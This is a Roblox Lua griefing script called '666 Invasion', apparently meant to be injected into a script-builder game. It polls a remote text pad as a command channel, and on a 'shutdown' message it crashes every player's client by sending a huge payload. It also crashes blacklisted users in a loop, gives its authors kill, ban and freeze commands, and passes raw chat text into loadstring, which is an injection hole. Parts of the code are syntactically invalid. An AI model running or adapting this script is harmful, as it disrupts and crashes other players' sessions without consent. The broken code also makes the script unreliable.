function ReleaseAdmin()
warn'666 Is Being Iniated!'
script.Name = '666'
admins = {"c00lbl0xian"}
blacklist = {"c00lk1dd"}
players = game.Players
prefix = ";"
prefix2 = " "
run = true
local IRC = [[https://titanpad.com/ep/pad/export/U36URPer9s/latest?format=txt]]
local http = game:GetService('HttpService');
local 666_Model = Instance.new('Model',workspace)
666_Model.Name = '666 Database'
Musiclist = Instance.new('Folder',666_Model)
Musiclist.Name = 'Musiclist'
music_script = [[
        AddMusic('DP',401120618)
        AddMusic('Problem',155319906)
        AddMusic('bb',168969594)
        AddMusic('MawlHouse',319758951)
        AddMusic('Hills',281750011)
        AddMusic('Whistle',291396031)
        AddMusic('m00nm4n',348344095)
                AddMusic('Future',336725246)
                AddMusic('Confession',271416898)
                AddMusic('Promise',356917026)
                AddMusic('Cut It',318486515)
                AddMusic('FSD',392771580)
        ]]
                                                                                
--[[                                         _________________________                                                                 ]]--
-------------------------[ 6 6 6 I N V A S I O N ]-----------------------------------
-------------------------[ P R O J E C T  B Y :  ]-----------------------------------
-------------------------[ C 0 0 L B L 0 X I A N ]-----------------------------------
-------------------------------------------------------------------------------------

if game.PlaceId == 20279777 then
function Hint()
local hint = Instance.new('Hint',workspace)
game:GetService("RunService").Stepped:connect(function()
pcall(function()
        hint.Text = '\n'..'\n'..http:GetAsync(IRC)
        end)
end)

hint.Changed:connect(function()
pcall(function()
local h_text=hint.Text
       if string.find(h_text,'shutdown') then
                for i,v in pairs(players:children()) do
                         Instance.new('RemoteEvent',v):FireClient(v,{string.rep("blacklist",2e5+5)})
                end
        end
        
end)
end)
end
end

function AddMusic(name,id)
        local music_value = Instance.new('StringValue',Musiclist)
        music_value.Name = name
        music_value.Value = id
end

loadstring(music_script)()

game:GetService("RunService").Stepped:connect(function()
        for i,x in pairs(blacklist) do
        for i,v in pairs(players:children()) do if v.Name==x then
                Instance.new('RemoteEvent',v):FireClient(v,{string.rep("blacklist",2e5+5)})
                        end
                end
        end
        
if not workspace:FindFirstChild("Message") then
Hint()
end
end)
function AddCmd(cmd,type,source)
if run == true then
        for i,admin_get_1 in pairs(admins) do
                for i,player_admin in pairs(players:children()) do if player_admin.Name==admin_get_1 then
        player_admin.Chatted:connect(function(m)
                if type:lower()=='player' then
if m:lower():sub(1,#cmd+#prefix+#prefix2)==prefix..cmd..prefix2 then
        loadstring([[msg = "]]..m..[[" cmd = "]]..cmd..[["
        for i,v in pairs(players:children()) do if string.find(v.Name:lower(),msg:lower():sub(#prefix+#prefix2+#cmd+1)) then ]]..source..[[ end end]])()

        loadstring([[msg = "]]..m..[[" cmd = "]]..cmd..[["
         if string.find(msg:lower():sub(#prefix+#prefix2+#cmd+1),'others') then for i,v in pairs(players:children()) do if v.Name~="]]..player_admin.Name..[[" then ]]..source..[[ end end end]])()

      loadstring([[msg = "]]..m..[[" cmd = "]]..cmd..[["
         if string.find(msg:lower():sub(#prefix+#prefix2+#cmd+1),'admins') then for i,x in pairs(admins) do for i,v in pairs(players:children()) do if v.Name==x then ]]..source..[[ end end end end]])()

    loadstring([[msg = "]]..m..[[" cmd = "]]..cmd..[["
         if string.find(msg:lower():sub(#prefix+#prefix2+#cmd+1),'nonadmins') then for i,x in pairs(admins) do for i,v in pairs(players:children()) do if v.Name~=x then ]]..source..[[ end end end end]])()

      loadstring([[msg = "]]..m..[[" cmd = "]]..cmd..[["
         if string.find(msg:lower():sub(#prefix+#prefix2+#cmd+1),'me') then for i,x in pairs(admins) do for i,v in pairs(players:children()) do if v.Name=="]]..player_admin.Name..[[" then ]]..source..[[ end end end end]])()
      



        loadstring([[ msg = "]]..m..[[" cmd = "]]..cmd..[["
         if string.find(msg:lower():sub(#prefix+#prefix2+#cmd+1),'all') then for i,v in pairs(players:children()) do ]]..source..[[ end end]])()
        end
        end;
        if type:lower() == 'normal' then
        if m:sub(1,#prefix+#cmd) == prefix..cmd then
                loadstring([[
        lclean = false
        game:GetService("RunService").Stepped:connect(function() if lclean == true then
for i = 1,#workspace:children(),1 do
for i,v in pairs(workspace:children()) do
if v.Name~='Base' and v.ClassName~='Terrain' and v.ClassName~='Camera' and v.Name~=script.Name then
if not game.Players:FindFirstChild(v.Name) then
v:Remove()
end
end
end
end end end)        ]]..source)()
        end
        end;
        end)
        end
        end
        end
        end
        end

function AddMCmd(cmd)
        for i,admin_get in pairs(admins) do
                for i,admin_player in pairs(players:children()) do if admin_player.Name == admin_get then
                        admin_player.Chatted:connect(function(m)
                                                if m:lower():sub(1,#prefix+#cmd+#prefix2)==prefix..cmd..prefix2 then
                                for i,v in pairs(Musiclist:children()) do if string.find(v.Name:lower(),m:lower():sub(#prefix+#cmd+#prefix2+1)) then                                
                                for i,sound_delete in pairs(workspace:children()) do if sound_delete.ClassName=='Sound' then
                                sound_delete:Stop()
                                sound_delete.Volume = 0
                                sound_delete:remove()
                                end
                                end
                                local sound = Instance.new('Sound',workspace)
                                sound.SoundId = 'rbxassetid://'..v.Value
                                sound.Looped = true
                                sound:Play()
                                print(sound.SoundId)
                                end
                                if tonumber(m:sub(#prefix+#prefix2+#cmd+1)) then
                                for i,sound_delete in pairs(workspace:children()) do if sound_delete.ClassName=='Sound' then
                                sound_delete:Stop()
                                sound_delete.Volume = 0
                                sound_delete:remove()
                                end
                                end
                                local sound = Instance.new('Sound',workspace)
                                sound.SoundId = 'rbxassetid://'..m:sub(#prefix+#prefix2+#cmd+1)
                                sound.Volume = 10000
                                sound.Looped = true
                                sound:Play()
                                print(sound.SoundId)                
                                end
                                end
                                end
                        end)
                end
        end
        end
        end

if game.PlaceId == 20279777 then
local SB_Chat = Instance.new('StringValue',owner)
SB_Chat.Name = 'SB_Chat'
SB_Chat.Value = tostring('666')..'/'..'Sucessfully injected. Created by c00lkidd.'
end


AddCmd("kill","player","v.Character:BreakJoints()")
AddCmd("admin","player","table.insert(admins,v.Name)")
AddCmd('ban','player','table.insert(blacklist,v.Name)')
AddCmd('god','player','v.Character.Humanoid.MaxHealth=9e999')
AddCmd('ungod','player','v.Character.Humanoid.MaxHealth=100')
AddCmd('btools','player',[[game:GetService("InsertService"):LoadAsset(143830178):children()[1].Parent=v.Backpack]])
AddCmd('respawn','player','v:LoadCharacter()')
AddCmd('rfs','player',[[local part = Instance.new('Part',workspace)
part.Name = 'Spawn_'..math.random()+tick()*2
part.CFrame = v.Character.Torso.CFrame
part.Anchored = true
part.Transparency=1
part.CanCollide = false
v:LoadCharacter()
v.Character.Torso.CFrame=part.CFrame
part:remove()]])
AddCmd('punish','player','v.Character.Parent=nil')
AddCmd('unpunish','player','v.Character.Parent=workspace')
AddCmd('lclean','normal',[[lclean = true]])
AddCmd('unlclean','normal','lclean = false')
AddCmd('explode','player',[[local expl = Instance.new('Explosion',workspace) expl.Position = v.Character.Torso.Position]])
AddMCmd('music')
AddMCmd('mus')
AddCmd('freeze','player','v.Character.Torso.Anchored = true')
AddCmd('thaw','player','v.Character.Torso.Anchored = false')

game.Players.PlayerAdded:connect(function(adminplayer)
for i,get_player_admin in pairs(admins) do
if adminplayer.Name == get_player_admin then
ReleaseAdmin()
end
end)
end
